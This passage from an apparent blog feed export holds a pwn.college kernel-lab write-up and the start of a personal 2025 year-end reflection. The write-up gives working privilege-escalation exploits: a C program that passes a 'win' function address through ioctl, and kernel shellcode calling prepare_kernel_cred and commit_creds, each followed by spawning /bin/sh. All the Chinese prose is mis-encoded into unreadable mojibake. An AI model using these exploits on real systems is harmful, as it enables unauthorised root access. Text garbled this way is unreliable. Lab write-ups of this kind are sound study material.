class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_9C8);</span><br><span class="line">  v0 = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">  commit_creds(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æˆ‘ä»¬æŠŠioctlçš„ç¬¬ä¸‰ä¸ªå‚æ•° å¸ƒç½®æˆwinçš„åœ°å€ï¼Œå°±å¯ä»¥å®Œæˆgetshell</p><p>ä½†æ˜¯winçš„åœ°å€æˆ‘ä»¬æ€ä¹ˆè·å¾—å‘¢ï¼Ÿè¿™ä¸ªæ¶‰åŠåˆ°å†…æ ¸çš„ä¿æŠ¤ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªç±»ä¼¼äºç”¨æˆ·æ€çš„ä¿æŠ¤<code>aslr</code>â€”&gt; <code>kaslr</code>ï¼Œè¿™ä¸ªä¿æŠ¤çš„ä½œç”¨å°±æ˜¯åœ°å€éšæœºåŒ–ï¼Œä¼šæŠŠåœ°å€éšæœºæ˜ å°„åˆ°ä¸€æ®µç©ºé—´ï¼Œ</p><p>å½“ç„¶ç›®å‰çš„æ˜¯æ²¡æœ‰<code>kaslr</code>çš„ï¼Œä¹Ÿå°±æ˜¯<code>nokaslr</code>ï¼Œè€Œæˆ‘ä»¬éœ€è¦<code>cat /proc/kallsyms</code>å°±å¯ä»¥çœ‹åˆ°åœ°å€äº†ï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦rootæƒé™ï¼Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯pwncollegeçš„ç»ˆç«¯é‡Œé¢çš„vm,é‚£ä¹ˆä½ éœ€è¦åœ¨å³ä¸‹è§’å°†è¿™ä¸ªç‚¹å‡»ä¸€ä¸‹ï¼Œä½¿å…¶å¤„äºå¼€é”çš„å›¾æ ‡çŠ¶æ€;;;!!!!!!!åˆ‡è®°ï¼Œå¦‚æœéœ€è¦è¿œç¨‹çš„flag,å°±éœ€è¦æŠŠå®ƒåˆ‡æ¢æˆé”ä½çš„çŠ¶æ€ï¼Œä½†æ˜¯è¿™æ ·æ— æ³•ä½¿ç”¨<code>sudo</code></p><img src="/2026/01/11/college/2026-01-11-pwncollege/leave5.0-1.png" class><p>ä»è€Œå¯ä»¥ä½¿ç”¨<code>sudo su</code>,å¦‚å›¾</p><img src="/2026/01/11/college/2026-01-11-pwncollege/leave5.0-2.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@vm_practice~kernel-security~level5-0:/home/hacker# cat /proc/kallsyms | grep win</span><br><span class="line">ffffffff81050a70 T unwind_next_frame</span><br><span class="line">ffffffff81051000 T __unwind_start</span><br><span class="line">ffffffff81051220 T unwind_get_return_address</span><br><span class="line">ffffffff81051250 T unwind_module_init</span><br><span class="line">ffffffff81051300 T unwind_get_return_address_ptr</span><br><span class="line">ffffffff81051327 t unwind_next_frame.cold</span><br><span class="line">ffffffff810b3a30 T kmsg_dump_rewind</span><br><span class="line">ffffffff810b6980 T kmsg_dump_rewind_nolock</span><br><span class="line">ffffffff813bc350 t zlib_updatewindow</span><br><span class="line">ffffffff813be740 t fill_window</span><br><span class="line">ffffffff813e12d0 T pci_disable_bridge_window</span><br><span class="line">ffffffff813e2da0 t extend_bridge_window.isra.0.part.0</span><br><span class="line">ffffffff813e3a50 W pcibios_window_alignment</span><br><span class="line">ffffffff81406410 t con2fb_acquire_newinfo</span><br><span class="line">ffffffff8140cc60 T acpi_osi_is_win8</span><br><span class="line">ffffffff81488f90 t hvc_set_winsz</span><br><span class="line">ffffffff814aaed0 T iommu_domain_window_enable</span><br><span class="line">ffffffff814aaef0 T iommu_domain_window_disable</span><br><span class="line">ffffffff81543fc0 t __unwind_incomplete_requests</span><br><span class="line">ffffffff81546980 T execlists_unwind_incomplete_requests</span><br><span class="line">ffffffff815c6930 t dsi_program_swing_and_deemphasis</span><br><span class="line">ffffffff815c6fa0 t gen11_dsi_voltage_swing_program_seq</span><br><span class="line">ffffffff815cc7c0 t icl_ddi_combo_vswing_program</span><br><span class="line">ffffffff815cca90 t icl_combo_phy_ddi_vswing_sequence</span><br><span class="line">ffffffff815cd0b0 t cnl_ddi_vswing_program.isra.0</span><br><span class="line">ffffffff815cd500 t cnl_ddi_vswing_sequence</span><br><span class="line">ffffffff815cdd90 t icl_ddi_vswing_sequence</span><br><span class="line">ffffffff815ce350 t bxt_ddi_vswing_sequence.isra.0</span><br><span class="line">ffffffff81701a40 T pcmcia_release_window</span><br><span class="line">ffffffff81701e20 T pcmcia_request_window</span><br><span class="line">ffffffff81806bd0 t snd_pcm_rewind.part.0</span><br><span class="line">ffffffff8182d430 t twinhead_reserve_killing_zone</span><br><span class="line">ffffffff8182d6a7 t twinhead_reserve_killing_zone.cold</span><br><span class="line">ffffffff81883db0 t tx_window_errors_show</span><br><span class="line">ffffffff818e0600 t tcp_grow_window.isra.0</span><br><span class="line">ffffffff818e9820 T tcp_select_initial_window</span><br><span class="line">ffffffff818eb090 T __tcp_select_window</span><br><span class="line">ffffffff818ef200 T tcp_send_window_probe</span><br><span class="line">ffffffff818f58c0 T tcp_openreq_init_rwin</span><br><span class="line">ffffffff819c5e50 t xprt_iter_no_rewind</span><br><span class="line">ffffffff819c5e60 t xprt_iter_default_rewind</span><br><span class="line">ffffffff81aa43b0 t minmax_subwin_update</span><br><span class="line">ffffffff81c01480 T rewind_stack_do_exit</span><br><span class="line">ffffffff82e66683 T unwind_init</span><br><span class="line">ffffffff82e90e40 t __acpi_osi_setup_darwin</span><br><span class="line">ffffffff82e90f4b t dmi_disable_osi_win8</span><br><span class="line">ffffffff82e90f6a t dmi_disable_osi_win7</span><br><span class="line">ffffffffc000092d t win  [challenge]                          ; å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯winçš„åœ°å€</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> file_Path <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD 1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> win_Addr 0xffffffffc000092d</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(file_Path, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd&lt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;File is Error! plase choose true file-path!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ioctl(fd, CMD,win_Addr);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leave5.1åŒä¸Š</p><h1 id="leave6-0-leave6-1"><a href="#leave6-0-leave6-1" class="headerlink" title="leave6.0&amp;&amp;leave6.1"></a>leave6.0&amp;&amp;leave6.1</h1><p>å¯ä»¥çœ‹åˆ°ï¼Œé¦–å…ˆåˆ›å»ºäº†ä¸€å—å †å†…å­˜ï¼Œç”¨äºå­˜æ”¾shellcode,å¹¶ä¸”æœ‰å¯æ‰§è¡Œï¼Œå¯å†™çš„æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  shellcode = (<span class="type">unsigned</span> __int8 *)_vmalloc(<span class="number">4096</span>, <span class="number">3264</span>, _default_kernel_pte_mask &amp; <span class="number">0x163</span>);</span><br><span class="line">  proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">  printk(&amp;unk_B6E);</span><br><span class="line">  printk(&amp;unk_9C8);</span><br><span class="line">  printk(&amp;unk_B6E);</span><br><span class="line">  printk(&amp;unk_9F8);</span><br><span class="line">  printk(&amp;unk_A60);</span><br><span class="line">  printk(&amp;unk_AC0);</span><br><span class="line">  printk(&amp;unk_B08);</span><br><span class="line">  printk(&amp;unk_B75);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000CC0 fops            file_operations &lt;0, 0, 0, offset device_write, 0, 0, 0, 0, 0, 0, 0, 0,\</span><br><span class="line">.data:0000000000000CC0                                         ; DATA XREF: init_module+1Câ†‘o</span><br><span class="line">.data:0000000000000CC0                                  0, 0, offset device_open, 0, offset device_release, \</span><br><span class="line">.data:0000000000000CC0                                  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_988);</span><br><span class="line">  v5 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  v6 = copy_from_user(shellcode, buffer, v5);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> length - v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå†™å…¥shellcodeåˆ°shellcodeé‡Œé¢ï¼Œç„¶åå»æ‰§è¡Œshellcode</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™ä¸€æ®µshellcodeè¿›å»ï¼š<br>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;axium/axium.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clang-format off */</span></span><br><span class="line">DEFINE_SHELLCODE(shellcode) &#123;</span><br><span class="line">  <span class="comment">/* 6.0</span></span><br><span class="line"><span class="comment">   prepare_kernel_cred ==  0xffffffff81089660</span></span><br><span class="line"><span class="comment">   commit_creds == 0xffffffff81089310</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 6.1</span></span><br><span class="line"><span class="comment">   * commit_creds == 0xffffffff81089310</span></span><br><span class="line"><span class="comment">   * prepare_kernel_cred == 0xffffffff81089660 </span></span><br><span class="line"><span class="comment">   * */</span></span><br><span class="line">  SHELLCODE_START(shellcode);</span><br><span class="line">  __asm__ <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;xor rdi,rdi</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;mov rax, 0xffffffff81089660</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;call rax</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    <span class="string">&quot;mov rdi,rax</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;mov rax,0xffffffff81089310</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;call rax</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;ret</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;</span></span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line"></span><br><span class="line">  SHELLCODE_END(shellcode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* clang-format on */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  set_log_level(DEBUG);</span><br><span class="line"></span><br><span class="line">  <span class="type">payload_t</span> payload;</span><br><span class="line">  payload_init(&amp;payload);</span><br><span class="line">  PAYLOAD_PUSH_SC(&amp;payload, shellcode);</span><br><span class="line">  <span class="comment">//  hexdump(payload.data, payload.size, NULL);</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="type">int</span> ret = write(fd, payload.data, payload.size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Open Fd is %d,and Write ret is %d</span></span><br><span class="line"><span class="string">&quot;</span>, fd, ret);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  payload_fini(&amp;payload);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmm,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    &quot;xor rdi,rdi</span><br><span class="line">&quot;</span><br><span class="line">    &quot;mov rax, 0xffffffff81089660</span><br><span class="line">&quot;</span><br><span class="line">    &quot;call rax</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">    &quot;mov rdi,rax</span><br><span class="line">&quot;</span><br><span class="line">    &quot;mov rax,0xffffffff81089310</span><br><span class="line">&quot;</span><br><span class="line">    &quot;call rax</span><br><span class="line">&quot;</span><br><span class="line">    &quot;ret</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µæ˜¯ææƒçš„shellcode ï¼Œå®é™…ä¸Šä½¿ç”¨çš„æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0 = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">commit_creds(v0);</span><br></pre></td></tr></table></figure><p>ç„¶åshellcodeçš„æ¡†æ¶æ˜¯Cuå†™çš„<a href="https://github.com/CuB3y0nd/axium">axium</a>å¯ä»¥å»çœ‹çœ‹ï¼Œç”¨ç€è¿˜å¯ä»¥</p><p>leave6.1åŒä¸Š</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025å¹´ç»ˆæ€»ç»“</title>
      <link href="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬ä½œäº2025-12-27<br>emm,çœ‹åˆ°Cuæœ‰å†™å¹´ç»ˆæ€»ç»“ï¼Œé‚£ä¹ˆæˆ‘å¿ƒè¡€æ¥æ½®ä¹Ÿå†™ä¸€ä¸ªï¼Œè™½ç„¶å¾ˆæ—©ä¹‹å‰æœ‰è¿‡è¿™ä¸ªæƒ³æ³•ï¼Œ<del>å¤§æŠµè®°å½•ä¸€äº›çäº‹å§ï¼Œæ¯•ç«Ÿä¹Ÿæ²¡æœ‰ä»€ä¹ˆè½°è½°çƒˆçƒˆçš„ç»å†</del><br>&lt;ç¿»äº†ç¿»ç›¸å†Œï¼Œç«Ÿç„¶æ²¡ä»€ä¹ˆç…§ç‰‡&gt;</p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="å…³äºæˆ‘è¿™ä¸€å¹´"><a href="#å…³äºæˆ‘è¿™ä¸€å¹´" class="headerlink" title="å…³äºæˆ‘è¿™ä¸€å¹´"></a>å…³äºæˆ‘è¿™ä¸€å¹´</h2><p>  æ€ä¹ˆè¯´å‘¢ï¼Œæˆ‘å…¶å®ä¸å¤ªæ¸…æ¥šæˆ‘è¿™ä¸€å¹´çš„æˆå°±ï¼Œæˆ‘åœ¨å»å¹´å¯’å‡çš„æ—¶å€™å¼€å§‹å­¦ä¹ å †ï¼Œä½†æ˜¯æˆ‘æ¸…æ¥šæˆ‘è‡ªå·±å…¶å®ä¸æ˜¯å¾ˆæ“…é•¿å­¦ä¹ ï¼Œæˆ‘å¾ˆç¬¨ï¼Œæ— æ³•å»å¾ˆå¿«çš„å­¦å®Œä¸€äº›æ˜æ˜çœ‹èµ·æ¥å¾ˆç®€å•çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘çš„å †å­¦ä¹ çš„å¼‚å¸¸è‰°éš¾ï¼Œå› ä¸ºæˆ‘å¥½åƒæ— æ³•ç†è§£å †ä¹‹é—´çš„æ“ä½œï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘é‚£ä¸ªæ—¶å€™åŸºç¡€å·¨å·®ï¼Œå­¦äº†ä¸€äº›åŸºç¡€çš„å †å—æ“ä½œï¼Œä½ç‰ˆæœ¬çš„å †æ¼æ´ï¼Œæˆ‘å°±æ²¡æœ‰ç»§ç»­å­¦å †äº†ï¼Œå› ä¸ºæˆ‘è²Œä¼¼å­¦ä¸ä¸‹å»äº†ï¼Œ</p><p>  åæ¥ï¼Œæˆ‘åœ¨ç¾¤é‡Œé—®é—®é¢˜çš„æ—¶å€™ï¼Œå¾ˆå¹¸è¿ï¼Œæˆ‘è®¤è¯†äº†<code>Astra</code>ï¼ŒAstraå¯ä»¥ç®—æ˜¯æˆ‘çš„è‰¯å¸ˆäº†ã€‚ä»–å¸®åŠ©æˆ‘æ‰­è½¬äº†å¾ˆå¤šé”™è¯¯çš„è§‚å¿µï¼Œä»–å‡ ä¹å½±å“äº†æˆ‘å¯¹pwnçš„æ•´ä¸ªè®¤çŸ¥</p><p>  åé¢æˆ‘å»æ‰“å·¥ï¼Œæš‘å‡å›å­¦æ ¡ä¹‹åï¼Œæ‰“çœèµ›ï¼Œpwnåªæœ‰ä¸€é“é¢˜ç›®ï¼Œéå¸¸ç®€å•çš„æ ˆçš„ORWï¼Œä½†æ˜¯æˆ‘å†™ä¸æ¥ï¼ŒAstraè²Œä¼¼æœ‰äº‹ï¼Œæ‰€ä»¥æ²¡åŠæ³•å¸®åŠ©æˆ‘ï¼Œæˆ‘å½“æ—¶å››ä¸ªå°æ—¶ï¼Œè°ƒé‚£é“é¢˜ç›®ï¼Œè¶Šå†™è¶Šå´©æºƒï¼Œæˆ‘ç”šè‡³æ€€ç–‘æˆ‘åº”ä¸åº”è¯¥ç»§ç»­èµ°è¿™æ¡è·¯ï¼Œå¥½åœ¨æˆ‘è¿™ä¸ªäººèµ°å‡ºæ¥æ¯”è¾ƒå¿«ï¼Œæˆ‘å¾ˆå¿«æƒ³é€šäº†ï¼Œæˆ‘ç«Ÿç„¶å¼€å§‹äº†ï¼Œå°±æ— è®ºå¦‚ä½•éƒ½è¦å­¦ä¸‹å»ï¼Œå®åœ¨ä¸è¡Œï¼Œæ­»è‚å®ƒï¼Œæˆ‘å°±ä¸ä¿¡æˆ‘åˆ‡ä¸åŠ¨å®ƒï¼</p><p>  äºæ˜¯ä¹ï¼Œæˆ‘å¼€å§‹è¡¥ä¹ æ ˆï¼Œæˆ‘å°†å‰é¢çš„æ ˆçš„æ¼æ´åŸºæœ¬è¡¥ä¹ è¿‡ä¸€éï¼Œè¿™å‡ ä¹ç”¨æ‰äº†æˆ‘ä¸€ä¸ªå­¦æœŸçš„æ—¶é—´ï¼Œæˆ‘å¼€å§‹å­¦ä¹ ï¼Œæ€è€ƒï¼Œç†è§£è¿™å…¶ä¸­çš„æ€è·¯ï¼Œå¹¶ä¸”è®¤è¯†äº†è®¸å¤šçš„å¸ˆå‚…ï¼Œæ¯”å¦‚AâœŒï¸ï¼ŒCuï¼Œå½“ç„¶ä¹Ÿæ˜¯å½“ä¸Šäº†<code>&quot;å¤§ä½¬&quot;</code>ï¼Œä½œä¸ºèœèœçš„æˆ‘æ²¡æƒ³åˆ°ç«Ÿç„¶ä¹Ÿæ˜¯å¼€å§‹å¸¦èŒæ–°äº†ã€‚è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œä¸è¿‡æœ‰çš„é—®é¢˜çœŸçš„å®¹æ˜“æ°”å¾—è„‘æº¢è¡€ï¼Œå“ˆå“ˆå“ˆå“ˆï¼Œä¹Ÿæ˜¯ä½“éªŒåˆ°äº†<code>Astra</code>æ•™æˆ‘çš„æ—¶å€™çš„æ„Ÿå—äº†ï¼Œæ„Ÿè§¦è¿˜æ˜¯æŒºæ·±çš„ï¼Œä¸è¿‡ï¼Œè¯´ä¸å¤ªå‡ºæ¥å°±æ˜¯äº†ï¼›å¸Œæœ›æ–°çš„ä¸€å¹´ï¼Œæˆ‘èƒ½å¤Ÿå¤šæ‹¿ç‚¹æœ‰ç”¨çš„å¥–ï¼Œæ‰¾åˆ°å®ä¹ ï¼Œå­¦åˆ°èƒ½å°±ä¸šçš„æ°´å¹³ï¼Œé‡åˆ°è¶Šæ¥è¶Šå¤šå¿—åŒé“åˆçš„å¸ˆå‚…ï¼Œ</p><h2 id="æ¯”è¾ƒé‡è¦çš„æœˆä»½"><a href="#æ¯”è¾ƒé‡è¦çš„æœˆä»½" class="headerlink" title="æ¯”è¾ƒé‡è¦çš„æœˆä»½"></a>æ¯”è¾ƒé‡è¦çš„æœˆä»½</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> mouth[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> i_Remember[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i&lt;=<span class="number">12</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(mouth[i]==i_Remember)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] %d is gread mouth,and things is %c</span></span><br><span class="line"><span class="string">&quot;</span>,i,i_Remember);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’³å’³ï¼Œææ€ªä¸€ä¸‹ ğŸ˜</p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº›æˆ‘å­˜ä¸‹æ¥çš„å›¾ç‰‡å˜</p><p>è¿™æ˜¯å½“æ—¶æˆ‘è¿›å®éªŒå®¤çš„æ–°ç”Ÿèµ›çš„pwn,&lt;å…¶å®æˆ‘ä¸€å¼€å§‹æ˜¯webæ‰‹çš„ qwq è¢«å­¦é•¿å¿½æ‚ äº†&gt;ï¼Œåé¢ï¼Œæˆ‘å°è¯•AKäº†</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/%E7%AC%91.png" class><p>ä¸€äº›é¢˜ç›®ï¼Œ</p><p>å°±æ˜¯è¿™ä¸ªé¢˜ï¼Œå¡ä½äº†ä¸¤ä¸‰ä¸ªå°æ—¶ï¼Œä¸è¿‡ä¹Ÿæ˜¯è¿™é“é¢˜ï¼Œè®©æˆ‘è®¤è¯†äº†<code>Astra</code> ï¼Œè¿™ç®—ä¸ç®—ç¦ç¥¸ç›¸ä¾å‘¢ å“ˆå“ˆ</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/SB.jpg" 